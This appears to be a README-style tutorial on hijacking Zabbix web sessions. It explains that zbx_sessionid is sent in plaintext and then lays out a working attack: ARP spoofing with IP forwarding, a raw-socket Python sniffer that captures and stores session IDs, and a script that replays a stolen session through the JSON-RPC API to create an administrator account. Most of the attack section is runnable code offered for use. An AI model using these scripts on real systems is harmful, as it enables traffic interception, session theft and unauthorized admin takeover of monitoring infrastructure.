## A bit of theory
The Zabbix server port is 10051 by default and the agent's is 10050.

Traffic between the agent and the server (if you don't configure the encryption of the transmitted data in the agent configuration)
is transmitted in plaintext, in TCP packets with the PSH flag.

Zabbix APIs are web-based and delivered as part of the Web interface and use the JSON-RPC 2.0 protocol.
To use most of Zabbix's features it's enough to send HTTP POST requests to the api_jsonrpc.php file, which is located in a folder with a web interface.

This means that when authorizing a user on the system (for example, when the administrator logs into the Zabbix web interface), a request / response is made in the JSON format.
For each user, zbx_sessionid is generated, and used in queries to the Zabbix server.

The zbx_sessionid transfer process occurs when the user is authorized through the web interface, entering their login and password.
Value of zbx_sessionid «salted» with timestamp which almost excludes its forgery.
However, it is passed to the zbx_sessionid field in the POST request in plain text.

Is it possible to reuse the intercepted zbx_sessionid? Yes, it is, while the user is logged in the system.

## Hijacking
We will use the simplest method - arp spoofing and a custom script to look for the session id.

Let's enable package forwarding:
 ```bash
 sysctl –w net.ipv4.ip_forward=1
 ```
Begin arp spoofing (use for this whateva you want):

<a href="url"><img src="https://image.prntscr.com/image/nhTyrt3vTveE2_SFoeN1GA.png" align="justify"></a>

Start zbx_sessionid catching script:

```python
import socket
import re
s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
print ("trying to catch zbx_sessionid")
k = ''
while True:
    data = s.recvfrom(65565)
    try:
        if "HTTP" in data[0][54:]:
            raw = data[0][54:]
            if "\r\n\r\n" in raw:
                line = raw.split('\r\n\r\n')[0]
                print "[*] Header Captured "
                value = line
                m = re.search("(zbx_sessionid.*)", value)
                if m:
                    str = m.group(0)
                    k = re.split(r'\W+', str)
                    print ("session_id is :")
                    print (k[1])
                    ####Saving zbx_sessionid in file
                    saved_zbxssids = open('zbx_sessionids.txt','a')
                    saved_zbxssids.write('\n')
                    saved_zbxssids.write(k[1]) 
                    saved_zbxssids.write('\n')
                    saved_zbxssids.close()
                    print ("zabbix session id saved in file zbx_sessionids.txt")
                else:
                    pass
            else:
                pass
    except KeyboardInterrupt:
        s.close()
```


## Postexploitation time

It's time to create account with administrator privileges.
The following script will help us:

```python
import json
import requests
from pyzabbix import ZabbixAPI
#api_address="http://192.168.56.102/zabbix/api_jsonrpc.php"
api_address=raw_input("enter correct URL to api_jsonrpc.php, like http://192.168.56.102/zabbix/api_jsonrpc.php"": \n")
zbx_sessionid= raw_input("enter zbx_sessionid: \n")
user= raw_input("enter username: \n")
password= raw_input("enter password: \n")
url = api_address
headers = {'Content-type': 'application/json'}
data = {"jsonrpc": "2.0", "method": "user.create", "params": {
    "alias": user, "passwd": password, "type": "3", "usrgrps": [
        {"usrgrpid": "7"}], },
        "auth": zbx_sessionid,
        "id": 1
        }
answer = requests.post(url, data=json.dumps(data), headers=headers)
print(answer)
response = answer.json()
print(response)
###Using pyzabbix to connect whith created user creds
print ("testing user parameters:")
zapi = ZabbixAPI(api_address)
zapi.login(user, password)
print("Connected to Zabbix API Version %s" % zapi.api_version())
```

<a href="url"><img src="https://image.prntscr.com/image/yayqk9aPQ0C_LsHYF-HNow.png" align="justify" width="480"></a>

Check web interface:

<a href="url"><img src="https://image.prntscr.com/image/_d22yTWMRVuP6PNGCkuZ1Q.png" align="justify" width="640"></a>
